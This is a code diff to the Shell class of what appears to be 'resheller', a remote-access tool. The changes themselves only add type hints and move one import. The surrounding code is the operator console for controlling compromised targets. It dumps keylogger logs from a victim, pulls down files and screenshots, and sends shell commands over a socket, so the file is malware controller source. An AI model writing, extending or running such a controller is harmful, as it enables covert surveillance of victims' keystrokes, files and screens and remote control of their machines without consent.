@@ -5,13 +5,13 @@ from pathlib import Path
 from time import strftime
 
 from lib.pipe import SafeSocket
+from lib.stdout import color
 from server.ps1 import Ps1
-from lib.colors import color
 
 
 class Shell:
 
-    def __init__(self, ips, targets, sessions):
+    def __init__(self, ips: list, targets: list, sessions) -> None:
         self.ips = ips
         self.targets = targets
         self.ip, _ = ips[sessions]
@@ -22,7 +22,7 @@ class Shell:
         self.log = None
 
     @staticmethod
-    def make_dir(cmd):
+    def make_dir(cmd: str) -> str:
         home = str(Path.home())
         date = strftime("%Y.%m.%d")
         main_dir = path.join(home, ".resheller")
@@ -31,7 +31,7 @@ class Shell:
             Path(_dir).mkdir(parents=True, exist_ok=True)
         return _dir
 
-    def keylogger(self, cmd):
+    def keylogger(self, cmd: str) -> None:
         if cmd == "dump":
             _dir = self.make_dir("logs")
             logs = path.join(_dir, f"keylog_{self.time}.txt")
@@ -45,7 +45,7 @@ class Shell:
         elif cmd == "print":
             print(self.log)
 
-    def download_file(self, cmd):
+    def download_file(self, cmd: str) -> None:
         count = 1
         _dir = self.make_dir("downloads")
         download = path.join(_dir, cmd)
@@ -61,7 +61,7 @@ class Shell:
             file.write(b64decode(payload))
         color.grn.print(f'Saved {download}\n')
 
-    def screenshot(self):
+    def screenshot(self) -> None:
         _dir = self.make_dir("screenshots")
         image = path.join(_dir, f"screenshot_{self.time}.png")
         payload = self.safe_sock.recv()
@@ -74,7 +74,7 @@ class Shell:
                 screenshot.close()
             color.grn.print(f"Saved {image}\n")
 
-    def print_stdout(self):
+    def print_stdout(self) -> None:
         stdout = self.safe_sock.recv()
         if stdout[:3] == "[+]":
             if len(stdout) > 3:
@@ -88,12 +88,12 @@ class Shell:
         print(stdout)
         return
 
-    def exit_shell(self):
+    def exit_shell(self) -> None:
         self.target.close()
         self.targets.remove(self.target)
         self.ips.remove(self.ip)
 
-    def shell(self):
+    def shell(self) -> None:
         while True:
             cmd = self.ps1.prompt()
             self.safe_sock.send(cmd)
